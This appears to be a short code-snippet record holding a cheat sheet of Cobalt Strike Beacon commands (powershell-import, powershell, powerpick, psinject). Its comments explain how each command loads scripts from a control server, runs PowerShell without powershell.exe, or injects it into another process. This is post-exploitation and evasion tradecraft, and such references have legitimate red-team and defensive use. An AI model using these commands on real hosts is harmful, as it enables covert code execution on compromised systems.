---
id: 494fd1b3-ec18-48cb-b042-48c8c6ab019b
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:16.489430+00:00'
updated_at: '2023-04-10T20:36:20.397330+00:00'
---

# Code Snippet 494fd1b3

**Language**: Powershell

```powershell
# Import a Powershell .ps1 script from the control server and save it in memory in Beacon
beacon > powershell-import [/path/to/script.ps1]

# Setup a local TCP server bound to localhost and download the script imported from above using powershell.exe. Then the specified function and any arguments are executed and output is returned.
beacon > powershell [commandlet][arguments]

# Launch the given function using Unmanaged Powershell, which does not start powershell.exe. The program used is set by spawnto
beacon > powerpick [commandlet] [argument]

# Inject Unmanaged Powershell into a specific process and execute the specified command. This is useful for long-running Powershell jobs
beacon > psinject [pid][arch] [commandlet] [arguments]
```


